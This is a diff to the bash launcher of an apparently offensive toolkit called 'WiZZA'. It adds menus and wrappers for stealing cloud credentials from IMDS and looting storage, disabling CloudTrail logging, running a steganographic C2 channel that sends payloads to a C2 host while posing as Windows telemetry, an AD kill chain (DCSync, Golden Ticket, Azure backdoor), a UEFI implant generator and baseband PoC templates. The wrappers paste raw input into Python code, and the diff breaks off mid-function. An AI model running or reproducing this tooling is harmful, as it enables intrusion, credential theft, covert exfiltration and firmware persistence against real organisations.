@@ -4355,6 +4355,34 @@ cmd_help() {
     echo -e "  ${C}bash start iot zoomeye <apikey> [query] [country] [limit]${N} ZoomEye IoT search (free)"
     echo -e "  ${C}bash start iot fofa <email> <apikey> [query] [country] [limit]${N} FOFA IoT search (free, no verify)"
     echo ""
+    echo -e "  ${Y}━━━ ADVANCED RESEARCH MODULES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "  ${C}bash start cloud${N}         Cloud infiltration module (IMDS→IAM→S3/KeyVault)"
+    echo -e "  ${C}bash start cloud aws${N}     AWS: IMDSv1/v2 creds, IAM enum, privesc, S3 loot"
+    echo -e "  ${C}bash start cloud azure${N}   Azure: IMDS token, subscriptions, Key Vault dump"
+    echo -e "  ${C}bash start cloud gcp${N}     GCP: metadata creds, GCS loot, Secret Manager"
+    echo -e "  ${C}bash start cloud auto${N}    Auto-detect provider (IMDS fingerprint) + full chain"
+    echo -e "  ${C}bash start stego${N}         Steganography C2 module"
+    echo -e "  ${C}bash start stego embed <cover> <payload> <out>${N}  LSB-embed into PNG"
+    echo -e "  ${C}bash start stego extract <stego>${N}               Extract from PNG"
+    echo -e "  ${C}bash start stego c2 <c2host>${N}                   DiagTrack telemetry C2"
+    echo -e "  ${C}bash start stego test${N}                          Self-test encode/decode"
+    echo -e "  ${C}bash start adchain${N}       AD→Cloud kill chain (Kerberoast→DCSync→Azure)"
+    echo -e "  ${C}bash start adchain recon <domain> <dc>${N}         BloodHound + LDAP recon"
+    echo -e "  ${C}bash start adchain roast <domain> <dc>${N}         Kerberoast + AS-REP"
+    echo -e "  ${C}bash start adchain dcsync <domain> <dc>${N}        DCSync (krbtgt hash)"
+    echo -e "  ${C}bash start adchain hunt${N}                        Hunt cloud creds on disk"
+    echo -e "  ${C}bash start adchain chain <domain> <dc>${N}         Full automated kill chain"
+    echo -e "  ${C}bash start uefi${N}          UEFI firmware research module"
+    echo -e "  ${C}bash start uefi extract${N}  Extract firmware via CHIPSEC or /dev/mem"
+    echo -e "  ${C}bash start uefi analyze <fw>${N}  Parse FV volumes, list DXE drivers"
+    echo -e "  ${C}bash start uefi implant <payload>${N}  Generate + inject DXE implant"
+    echo -e "  ${C}bash start uefi qemu <efi>${N}  Set up OVMF/QEMU test environment"
+    echo -e "  ${C}bash start baseband${N}      Baseband firmware research module"
+    echo -e "  ${C}bash start baseband acquire${N}  Pull modem firmware via ADB dd"
+    echo -e "  ${C}bash start baseband analyze <fw>${N}  Identify + disassemble (Shannon/Qualcomm)"
+    echo -e "  ${C}bash start baseband fuzz <fw>${N}  Set up AFL++/libFuzzer NAS harness"
+    echo -e "  ${C}bash start baseband cve${N}  CVE catalog + PoC templates (CVE-2023-24033...)"
+    echo ""
     echo -e "  ${Y}━━━ WIFI ATTACKS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
     echo -e "  ${C}bash start wifi${N}          Interactive WiFi attack menu"
     echo -e "  ${C}bash start wifi auto${N}     Auto: scan, pick, PMKID/handshake, crack"
@@ -4846,6 +4874,11 @@ cmd_help2() {
     echo -e "  ${W}Zero-click:${N}     Keylogger/op/modules/zero_click.py"
     echo -e "  ${W}Post-exploit:${N}   Keylogger/op/modules/post_exploit.py"
     echo -e "  ${W}Mobile PWN:${N}     Keylogger/op/modules/mobile_pwn.py"
+    echo -e "  ${W}Cloud infiltrate:${N} Keylogger/op/modules/cloud_infiltrate.py"
+    echo -e "  ${W}Stego C2:${N}       Keylogger/op/modules/stego_c2.py"
+    echo -e "  ${W}AD→Cloud chain:${N} Keylogger/op/modules/ad_cloud_chain.py"
+    echo -e "  ${W}UEFI implant:${N}   Keylogger/op/modules/uefi_implant.py"
+    echo -e "  ${W}Baseband research:${N} Keylogger/op/modules/baseband_research.py"
     echo -e "  ${W}Net CVEs:${N}       Keylogger/op/exploit/network_cve.py"
     echo -e "  ${W}Web CVEs:${N}       Keylogger/op/exploit/web_cve.py"
     echo -e "  ${W}eBPF script:${N}    Keylogger/op/kernel/ebpf_keylog.bt"
@@ -4984,6 +5017,120 @@ cmd_help2() {
     echo -e "  ${C}[14]${N} gdrv.sys       CVE-2018-19320  GIGABYTE App Center ≤2.x — arbitrary phys R/W + MSR"
     echo ""
 
+    # ── ADVANCED RESEARCH MODULES ──────────────────────────────────────────────
+    echo -e "  ${Y}━━━ CLOUD INFILTRATION MODULE  (start cloud) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "  ${C}start cloud${N}                  Interactive menu"
+    echo -e "  ${C}start cloud aws${N}              AWS full chain: IMDS creds → IAM enum → privesc → loot"
+    echo -e "    IMDSv1/v2 token grab, role name, AccessKeyId/SecretAccessKey/Token"
+    echo -e "    STS identity, attached policies, AdminAccess detection"
+    echo -e "    SSM managed instances, Lambda list, Secrets Manager + SSM Parameter Store"
+    echo -e "    S3 bucket ACL check, sensitive filename scan, download"
+    echo -e "    CloudTrail blind: stop-logging + clear event selectors"
+    echo -e "  ${C}start cloud azure${N}            Azure: IMDS OAuth2 token → subscriptions → Key Vault"
+    echo -e "    Bearer token from 169.254.169.254/metadata/identity/oauth2/token"
+    echo -e "    Subscriptions, resource groups, VMs, storage, Key Vaults"
+    echo -e "    Key Vault secrets/keys/certificates dump"
+    echo -e "    PRT theft: dsregcmd check + ROADtoken"
+    echo -e "  ${C}start cloud gcp${N}              GCP: metadata server → SA key → Secret Manager"
+    echo -e "    Token from metadata.google.internal with Metadata-Flavor: Google"
+    echo -e "    Projects, GCE instances, GCS buckets, Cloud Functions, Secret Manager"
+    echo -e "    New SA key creation for persistence"
+    echo -e "  ${C}start cloud auto${N}             Auto-detect AWS/Azure/GCP from IMDS, run full chain"
+    echo -e "  ${W}Module:${N}  op/modules/cloud_infiltrate.py"
+    echo ""
+
+    echo -e "  ${Y}━━━ STEGANOGRAPHY C2 MODULE  (start stego) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "  ${C}start stego${N}                  Interactive menu"
+    echo -e "  ${C}start stego embed <cover.png> <payload.bin> <out.png>${N}"
+    echo -e "    PIL-based LSB embedding: 1 bit per RGB channel byte"
+    echo -e "    Payload encrypted: zlib → XOR → base64"
+    echo -e "    Also supports JPEG EXIF UserComment embedding"
+    echo -e "  ${C}start stego extract <stego.png>${N}  Recover + decrypt embedded payload"
+    echo -e "  ${C}start stego polyglot <cover.png> <payload>${N}"
+    echo -e "    Creates file valid as both PNG and ZIP (telemetry.dat inside)"
+    echo -e "  ${C}start stego c2 <c2_host>${N}        DiagTrack telemetry C2 channel"
+    echo -e "    POST to /OneCollector/1.0/ mimicking Windows DiagTrack service"
+    echo -e "    Data chunked across data.metrics.m0000..mNNNN fields"
+    echo -e "    HTTP padding side channel: bit=0→64B body, bit=1→192B body"
+    echo -e "    TLS record size side channel for covert bit encoding"
+    echo -e "  ${C}start stego test${N}                 Self-test: encode + decode round-trip"
+    echo -e "  ${W}Module:${N}  op/modules/stego_c2.py"
+    echo ""
+
+    echo -e "  ${Y}━━━ AD→CLOUD KILL CHAIN  (start adchain) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "  ${C}start adchain${N}                Interactive menu"
+    echo -e "  ${C}start adchain recon <domain> <dc_ip>${N}  BloodHound + LDAP AD recon"
+    echo -e "    bloodhound-python: ACLs, kerberoastable SPNs, AS-REP targets, admincount"
+    echo -e "    ldapsearch: kerberoastable users, ASREP users, MSOL account"
+    echo -e "  ${C}start adchain roast <domain> <dc>${N}  Kerberoast + AS-REP roast"
+    echo -e "    impacket GetUserSPNs.py (Kerberoast) + GetNPUsers.py (AS-REP, no creds)"
+    echo -e "    Output hashes → hashcat -m 18200 (AS-REP) / -m 13100 (Kerberoast)"
+    echo -e "  ${C}start adchain dcsync <domain> <dc> [user]${N}  DCSync via impacket secretsdump"
+    echo -e "    Default target: krbtgt. dcsync_all() dumps all accounts"
+    echo -e "    Golden Ticket: impacket ticketer.py → saves .ccache"
+    echo -e "  ${C}start adchain hunt${N}              Hunt cloud creds on disk"
+    echo -e "    ~/.aws/credentials, ~/.azure/accessTokens.json, ~/.config/gcloud/"
+    echo -e "    Environment variables, IIS web.config, git repos"
+    echo -e "  ${C}start adchain aadconnect <dc> <domain> <msol_hash>${N}  Azure AD Connect abuse"
+    echo -e "    DCSync via MSOL service account → Azure AD credential harvest"
+    echo -e "  ${C}start adchain adfs <server> <cert>${N}  ADFS Golden SAML (ADFSpoof)"
+    echo -e "  ${C}start adchain chain <domain> <dc>${N}   Full 6-phase automated kill chain"
+    echo -e "    Phase 1: AD recon (BloodHound)  Phase 2: Kerberoast/AS-REP"
+    echo -e "    Phase 3: DCSync (krbtgt)         Phase 4: Cloud cred hunt"
+    echo -e "    Phase 5: Cloud takeover          Phase 6: Persistence (Golden Ticket + Azure backdoor)"
+    echo -e "  ${W}Module:${N}  op/modules/ad_cloud_chain.py"
+    echo ""
+
+    echo -e "  ${Y}━━━ UEFI FIRMWARE RESEARCH  (start uefi) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "  ${C}start uefi${N}                   Interactive menu"
+    echo -e "  ${C}start uefi extract${N}           Extract firmware via CHIPSEC or /dev/mem"
+    echo -e "    chipsec_util spi read 0x0 0x1000000 (full 16MB SPI flash)"
+    echo -e "    Fallback: /dev/mem read at 0xE0000 (128KB)"
+    echo -e "    EFI vars: /sys/firmware/efi/efivars (SecureBoot/PK/KEK/db)"
+    echo -e "  ${C}start uefi analyze <fw.bin>${N}  Parse firmware volumes"
+    echo -e "    Finds FV volumes by _FVH signature, parses FFS file headers"
+    echo -e "    Lists all DXE drivers by GUID, size, and offset"
+    echo -e "  ${C}start uefi secureboot${N}        Check SecureBoot + SetupMode EFI variables"
+    echo -e "  ${C}start uefi implant <payload.bin>${N}  Generate DXE driver implant"
+    echo -e "    C source: Base64 decoder, DropToESP() writes to EFI\\Microsoft\\Boot\\"
+    echo -e "    EFI variable persistence marker, mingw cross-compile"
+    echo -e "    inject_driver(): appends FFS file to DXE volume"
+    echo -e "  ${C}start uefi flash${N}             Print flash command (REQUIRES manual confirmation)"
+    echo -e "    Does NOT auto-execute — shows command only, operator runs it"
+    echo -e "  ${C}start uefi qemu <implant.efi>${N}  QEMU OVMF test environment"
+    echo -e "    Copies OVMF_CODE.fd/OVMF_VARS.fd, creates 64MB FAT32 ESP disk"
+    echo -e "    Populates EFI\\BOOT\\BOOTX64.EFI, generates run_qemu.sh"
+    echo -e "  ${C}start uefi integrity <fw> <baseline>${N}  SHA256 comparison"
+    echo -e "  ${C}start uefi scan [/boot/efi]${N}  Walk ESP, flag unknown .efi binaries"
+    echo -e "  ${W}Module:${N}  op/modules/uefi_implant.py"
+    echo ""
+
+    echo -e "  ${Y}━━━ BASEBAND RESEARCH FRAMEWORK  (start baseband) ━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "  ${C}start baseband${N}               Interactive menu"
+    echo -e "  ${C}start baseband acquire${N}        Acquire modem firmware"
+    echo -e "    ADB: detect device, find /dev/block/by-name/modem, dd + adb pull"
+    echo -e "    OTA: prints public sources (samfw.com, tadiphone.dev)"
+    echo -e "  ${C}start baseband identify <fw>${N}  Identify chipset + extract version strings"
+    echo -e "    Detects: Samsung Shannon (SSSS), Qualcomm (ELF), MediaTek magic"
+    echo -e "  ${C}start baseband analyze <fw>${N}   Deep analysis of firmware image"
+    echo -e "    Shannon: NAS/RRC/MM/SMS task names, ASN.1 patterns, NAS offsets"
+    echo -e "    objdump disassembly of NAS dispatcher region"
+    echo -e "  ${C}start baseband qemu <fw>${N}      QEMU ARM emulation harness"
+    echo -e "    Generates QEMU ARM launch script + peripheral stub C code"
+    echo -e "  ${C}start baseband fuzz <fw>${N}      Set up fuzzing harness"
+    echo -e "    AFL++ persistent mode: nas_parse_message() harness"
+    echo -e "    libFuzzer: LLVMFuzzerTestOneInput → asn1_decode()"
+    echo -e "    NAS seed generator: all message types + CVE-2023-24033 overflow cases"
+    echo -e "    Build script: AFL_USE_ASAN=1 make"
+    echo -e "  ${C}start baseband cve${N}            CVE catalog + PoC templates"
+    echo -e "    CVE-2023-24033: Samsung Shannon SDP heap OOB (SDP attribute overflow)"
+    echo -e "    CVE-2021-0920:  Qualcomm NAS UAF (NAS handler deregistration race)"
+    echo -e "    CVE-2022-22294: MediaTek RRC OOB (SIB1 length miscalculation)"
+    echo -e "    PoC template: crafts malformed SDP with oversized attribute"
+    echo -e "  ${W}All analysis runs on firmware images — no live radio required${N}"
+    echo -e "  ${W}Module:${N}  op/modules/baseband_research.py"
+    echo ""
+
     # ── BUILD ──────────────────────────────────────────────────────────────────
     echo -e "  ${Y}━━━ BUILD ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
     echo -e "  ${C}bash build.sh${N}                Compile worm to binary (PyInstaller + UPX)"
@@ -5028,6 +5175,17 @@ cmd_help2() {
     echo -e "  ${W}WiFi deauth:${N}         start wifi deauth <iface> <bssid>"
     echo -e "  ${W}Watch creds live:${N}    start creds"
     echo -e "  ${W}Kill everything:${N}     start down"
+    echo -e "  ${W}Cloud AWS:${N}           start cloud aws  →  IMDS creds → IAM → S3 loot"
+    echo -e "  ${W}Cloud Azure:${N}         start cloud azure  →  IMDS token → Key Vault dump"
+    echo -e "  ${W}Cloud GCP:${N}           start cloud gcp  →  metadata → Secret Manager"
+    echo -e "  ${W}Stego embed:${N}         start stego embed cover.png payload.bin out.png"
+    echo -e "  ${W}Stego C2:${N}            start stego c2 <c2host>  →  DiagTrack telemetry channel"
+    echo -e "  ${W}AD recon:${N}            start adchain recon <domain> <dc_ip>"
+    echo -e "  ${W}AD full chain:${N}       start adchain chain <domain> <dc>  →  6-phase automation"
+    echo -e "  ${W}UEFI extract:${N}        start uefi extract  →  CHIPSEC SPI read (run as root)"
+    echo -e "  ${W}UEFI QEMU test:${N}      start uefi qemu implant.efi  →  OVMF safe lab env"
+    echo -e "  ${W}Baseband acquire:${N}    start baseband acquire  →  ADB modem dd"
+    echo -e "  ${W}Baseband fuzz:${N}       start baseband fuzz fw.bin  →  AFL++ NAS harness"
     echo ""
 }
 
@@ -8380,6 +8538,567 @@ cve_geutebruck_rce('$IP')
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
+# Cloud Infiltration
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_cloud() {
+    local ACTION="${1:-menu}"
+    local MOD="$DIR/op/modules/cloud_infiltrate.py"
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |            WiZZA -- Cloud Infiltration Module             |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${W}[1]${N} AWS full chain    (IMDS → IAM enum → privesc → S3 loot)"
+            echo -e "  ${W}[2]${N} Azure full chain  (IMDS token → subscriptions → Key Vault)"
+            echo -e "  ${W}[3]${N} GCP full chain    (metadata → GCS → Secret Manager)"
+            echo -e "  ${W}[4]${N} Auto-detect + run (fingerprint IMDS, pick provider)"
+            echo -e "  ${W}[5]${N} CloudTrail blind  (AWS: stop logging + clear event selectors)"
+            echo ""
+            read -rp "  Select [1-5]: " sel
+            case "$sel" in
+                1) cmd_cloud aws ;;
+                2) cmd_cloud azure ;;
+                3) cmd_cloud gcp ;;
+                4) cmd_cloud auto ;;
+                5) cmd_cloud blind ;;
+            esac
+            ;;
+        aws)
+            echo -e "${Y}[*] AWS Cloud Infiltration${N}"
+            python3 - "$MOD" << 'PYEOF'
+import sys; sys.path.insert(0,''); exec(open(sys.argv[1]).read())
+from cloud_infiltrate import cloud_auto
+import json
+result = cloud_auto('aws')
+print(json.dumps(result, indent=2, default=str))
+PYEOF
+            ;;
+        azure)
+            echo -e "${Y}[*] Azure Cloud Infiltration${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from cloud_infiltrate import cloud_auto
+import json
+result = cloud_auto('azure')
+print(json.dumps(result, indent=2, default=str))
+"
+            ;;
+        gcp)
+            echo -e "${Y}[*] GCP Cloud Infiltration${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from cloud_infiltrate import cloud_auto
+import json
+result = cloud_auto('gcp')
+print(json.dumps(result, indent=2, default=str))
+"
+            ;;
+        auto)
+            echo -e "${Y}[*] Auto-detecting cloud provider...${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from cloud_infiltrate import cloud_auto
+import json
+result = cloud_auto('auto')
+print(json.dumps(result, indent=2, default=str))
+"
+            ;;
+        blind)
+            echo -e "${R}[!] CloudTrail blind — stops AWS logging${N}"
+            read -rp "    AWS Access Key: " AKEY
+            read -rp "    AWS Secret Key: " SKEY
+            read -rp "    AWS Session Token (blank if none): " STOK
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+import os
+os.environ['AWS_ACCESS_KEY_ID']='$AKEY'
+os.environ['AWS_SECRET_ACCESS_KEY']='$SKEY'
+${STOK:+os.environ['AWS_SESSION_TOKEN']='$STOK'}
+from cloud_infiltrate import aws_cloudtrail_blind
+import json; print(json.dumps(aws_cloudtrail_blind(), indent=2, default=str))
+"
+            ;;
+        *)
+            echo "Usage: start cloud [aws|azure|gcp|auto|blind]"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Steganography C2
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_stego() {
+    local ACTION="${1:-menu}"
+    local MOD="$DIR/op/modules/stego_c2.py"
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |            WiZZA -- Steganography C2 Module               |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${W}[1]${N} Embed payload into PNG  (LSB steganography)"
+            echo -e "  ${W}[2]${N} Extract payload from PNG"
+            echo -e "  ${W}[3]${N} Embed into JPEG EXIF"
+            echo -e "  ${W}[4]${N} Create PNG/ZIP polyglot"
+            echo -e "  ${W}[5]${N} DiagTrack telemetry C2 sender"
+            echo -e "  ${W}[6]${N} DiagTrack telemetry C2 receiver"
+            echo -e "  ${W}[7]${N} Self-test (encode/decode round-trip)"
+            echo ""
+            read -rp "  Select [1-7]: " sel
+            case "$sel" in
+                1) cmd_stego embed ;;
+                2) cmd_stego extract ;;
+                3) cmd_stego jpeg ;;
+                4) cmd_stego polyglot ;;
+                5) cmd_stego c2send ;;
+                6) cmd_stego c2recv ;;
+                7) cmd_stego test ;;
+            esac
+            ;;
+        embed|"")
+            read -rp "  Cover PNG path: " COVER
+            read -rp "  Payload file: " PAYLOAD
+            read -rp "  Output PNG path: " OUT
+            read -rp "  Encryption key [wizza]: " KEY; KEY="${KEY:-wizza}"
+            echo -e "${Y}[*] Embedding payload into $COVER${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from stego_c2 import png_embed
+png_embed('$COVER', open('$PAYLOAD','rb').read(), '$OUT', '$KEY')
+print('[+] Stego PNG written to $OUT')
+"
+            ;;
+        extract)
+            read -rp "  Stego PNG path: " STEGO
+            read -rp "  Output file (blank = stdout hex): " OUTF
+            read -rp "  Encryption key [wizza]: " KEY; KEY="${KEY:-wizza}"
+            echo -e "${Y}[*] Extracting from $STEGO${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from stego_c2 import png_extract
+data = png_extract('$STEGO', '$KEY')
+if '$OUTF':
+    open('$OUTF','wb').write(data); print('[+] Payload written to $OUTF')
+else:
+    print('[+] Payload:', data[:200])
+"
+            ;;
+        jpeg)
+            read -rp "  Cover JPEG path: " COVER
+            read -rp "  Payload file: " PAYLOAD
+            read -rp "  Output JPEG path: " OUT
+            read -rp "  Encryption key [wizza]: " KEY; KEY="${KEY:-wizza}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from stego_c2 import jpeg_exif_embed
+jpeg_exif_embed('$COVER', open('$PAYLOAD','rb').read(), '$OUT', '$KEY')
+print('[+] EXIF JPEG written to $OUT')
+"
+            ;;
+        polyglot)
+            read -rp "  Cover PNG path: " COVER
+            read -rp "  Payload file: " PAYLOAD
+            read -rp "  Output polyglot path: " OUT
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from stego_c2 import polyglot_create
+polyglot_create('$COVER', open('$PAYLOAD','rb').read(), '$OUT')
+print('[+] Polyglot PNG+ZIP written to $OUT')
+"
+            ;;
+        c2send)
+            read -rp "  C2 host (ip:port): " C2HOST
+            read -rp "  Payload to send: " PAYLOAD
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from stego_c2 import telemetry_send
+telemetry_send(open('$PAYLOAD','rb').read(), '$C2HOST')
+"
+            ;;
+        c2recv)
+            read -rp "  Bind address [0.0.0.0]: " BHOST; BHOST="${BHOST:-0.0.0.0}"
+            read -rp "  Bind port [8080]: " BPORT; BPORT="${BPORT:-8080}"
+            echo -e "${Y}[*] DiagTrack C2 receiver on $BHOST:$BPORT (Ctrl+C to stop)${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from stego_c2 import telemetry_recv
+telemetry_recv('$BHOST', int('$BPORT'))
+"
+            ;;
+        test)
+            echo -e "${Y}[*] Stego self-test${N}"
+            python3 "$MOD" test png
+            ;;
+        *)
+            echo "Usage: start stego [embed|extract|jpeg|polyglot|c2send|c2recv|test]"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# AD→Cloud Kill Chain
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_adchain() {
+    local ACTION="${1:-menu}"
+    local MOD="$DIR/op/modules/ad_cloud_chain.py"
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |           WiZZA -- AD→Cloud Kill Chain Module             |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${W}[1]${N} AD Recon       (BloodHound + LDAP enumeration)"
+            echo -e "  ${W}[2]${N} Kerberoast     (impacket GetUserSPNs.py)"
+            echo -e "  ${W}[3]${N} AS-REP Roast   (no creds, GetNPUsers.py)"
+            echo -e "  ${W}[4]${N} DCSync         (impacket secretsdump, get krbtgt)"
+            echo -e "  ${W}[5]${N} Cloud cred hunt (AWS/Azure/GCP creds on disk)"
+            echo -e "  ${W}[6]${N} Full kill chain (6-phase automated)"
+            echo ""
+            read -rp "  Select [1-6]: " sel
+            case "$sel" in
+                1) cmd_adchain recon ;;
+                2) cmd_adchain roast ;;
+                3) cmd_adchain asrep ;;
+                4) cmd_adchain dcsync ;;
+                5) cmd_adchain hunt ;;
+                6) cmd_adchain chain ;;
+            esac
+            ;;
+        recon)
+            read -rp "  Domain (e.g. corp.local): " DOMAIN
+            read -rp "  DC IP: " DCIP
+            read -rp "  Username (blank = anon): " USER
+            read -rp "  Password (blank = anon): " PASS
+            echo -e "${Y}[*] AD Recon: $DOMAIN @ $DCIP${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ad_cloud_chain import ADCloudChain
+c = ADCloudChain('$DOMAIN','$DCIP','${USER:-}','${PASS:-}',None)
+import json; print(json.dumps(c.ad_recon(), indent=2, default=str))
+"
+            ;;
+        roast)
+            read -rp "  Domain: " DOMAIN
+            read -rp "  DC IP: " DCIP
+            read -rp "  Username: " USER
+            read -rp "  Password: " PASS
+            echo -e "${Y}[*] Kerberoast: $DOMAIN${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ad_cloud_chain import ADCloudChain
+c = ADCloudChain('$DOMAIN','$DCIP','$USER','$PASS',None)
+import json; print(json.dumps(c.kerberoast(), indent=2, default=str))
+"
+            ;;
+        asrep)
+            read -rp "  Domain: " DOMAIN
+            read -rp "  DC IP: " DCIP
+            echo -e "${Y}[*] AS-REP Roast (no creds): $DOMAIN${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ad_cloud_chain import ADCloudChain
+c = ADCloudChain('$DOMAIN','$DCIP','','',None)
+import json; print(json.dumps(c.asrep_roast(), indent=2, default=str))
+"
+            ;;
+        dcsync)
+            read -rp "  Domain: " DOMAIN
+            read -rp "  DC IP: " DCIP
+            read -rp "  Username: " USER
+            read -rp "  NTLM hash (or leave blank + enter password): " HASH
+            [ -z "$HASH" ] && read -rp "  Password: " PASS
+            read -rp "  Target user [krbtgt]: " TUSER; TUSER="${TUSER:-krbtgt}"
+            echo -e "${Y}[*] DCSync: $TUSER from $DOMAIN${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ad_cloud_chain import ADCloudChain
+c = ADCloudChain('$DOMAIN','$DCIP','$USER','${PASS:-}','${HASH:-}')
+import json; print(json.dumps(c.dcsync('$TUSER'), indent=2, default=str))
+"
+            ;;
+        hunt)
+            echo -e "${Y}[*] Hunting cloud credentials on disk...${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ad_cloud_chain import ADCloudChain
+c = ADCloudChain('','','','',None)
+import json; print(json.dumps(c.cloud_cred_hunt(), indent=2, default=str))
+"
+            ;;
+        chain)
+            read -rp "  Domain: " DOMAIN
+            read -rp "  DC IP: " DCIP
+            read -rp "  Username: " USER
+            read -rp "  Password: " PASS
+            echo -e "${R}[!] Full 6-phase AD→Cloud kill chain: $DOMAIN${N}"
+            read -rp "    Confirm? [y/N]: " yn
+            [[ "$yn" =~ ^[Yy]$ ]] || { echo "Aborted."; return; }
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ad_cloud_chain import ADCloudChain
+c = ADCloudChain('$DOMAIN','$DCIP','$USER','$PASS',None)
+import json; print(json.dumps(c.kill_chain(), indent=2, default=str))
+"
+            ;;
+        *)
+            echo "Usage: start adchain [recon|roast|asrep|dcsync|hunt|chain]"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# UEFI Firmware Research
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_uefi() {
+    local ACTION="${1:-menu}"
+    local MOD="$DIR/op/modules/uefi_implant.py"
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |           WiZZA -- UEFI Firmware Research Module          |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${W}[1]${N} Extract firmware  (CHIPSEC SPI read / /dev/mem)"
+            echo -e "  ${W}[2]${N} Analyze firmware  (parse FV volumes, list DXE drivers)"
+            echo -e "  ${W}[3]${N} Check Secure Boot (EFI variable status)"
+            echo -e "  ${W}[4]${N} Generate DXE implant (C source + mingw compile)"
+            echo -e "  ${W}[5]${N} QEMU OVMF test environment"
+            echo -e "  ${W}[6]${N} Integrity check   (SHA256 vs baseline)"
+            echo -e "  ${W}[7]${N} Scan ESP for unknown .efi binaries"
+            echo ""
+            read -rp "  Select [1-7]: " sel
+            case "$sel" in
+                1) cmd_uefi extract ;;
+                2) cmd_uefi analyze ;;
+                3) cmd_uefi secureboot ;;
+                4) cmd_uefi implant ;;
+                5) cmd_uefi qemu ;;
+                6) cmd_uefi integrity ;;
+                7) cmd_uefi scan ;;
+            esac
+            ;;
+        extract)
+            check_root
+            read -rp "  Output path [/tmp/firmware.bin]: " OUTF; OUTF="${OUTF:-/tmp/firmware.bin}"
+            echo -e "${Y}[*] Extracting firmware to $OUTF${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from uefi_implant import UEFIResearch
+u = UEFIResearch()
+r = u.extract_firmware_chipsec('$OUTF')
+print(r)
+"
+            ;;
+        analyze)
+            read -rp "  Firmware binary path: " FW
+            [ -z "$FW" ] && { err "Firmware path required"; return; }
+            echo -e "${Y}[*] Analyzing $FW${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from uefi_implant import UEFIResearch
+u = UEFIResearch()
+import json; print(json.dumps(u.analyze_firmware('$FW'), indent=2, default=str))
+"
+            ;;
+        secureboot)
+            echo -e "${Y}[*] Checking Secure Boot status${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from uefi_implant import UEFIResearch
+u = UEFIResearch()
+import json; print(json.dumps(u.check_secure_boot(), indent=2, default=str))
+"
+            ;;
+        implant)
+            read -rp "  Payload binary to embed: " PAYLOAD
+            [ -z "$PAYLOAD" ] && { err "Payload path required"; return; }
+            echo -e "${Y}[*] Generating DXE implant for $PAYLOAD${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from uefi_implant import UEFIResearch
+u = UEFIResearch()
+import json; print(json.dumps(u.generate_dxe_driver('$PAYLOAD'), indent=2, default=str))
+"
+            ;;
+        flash)
+            echo -e "${R}[!] Flash firmware — DANGEROUS, one-way operation${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from uefi_implant import UEFIResearch
+u = UEFIResearch()
+u.flash_firmware()
+"
+            ;;
+        qemu)
+            read -rp "  Implant EFI path (blank = use BOOTX64.EFI shell): " IMPLANT
+            read -rp "  QEMU work dir [/tmp/uefi_qemu]: " QDIR; QDIR="${QDIR:-/tmp/uefi_qemu}"
+            echo -e "${Y}[*] Setting up OVMF QEMU test environment${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from uefi_implant import UEFIResearch
+u = UEFIResearch()
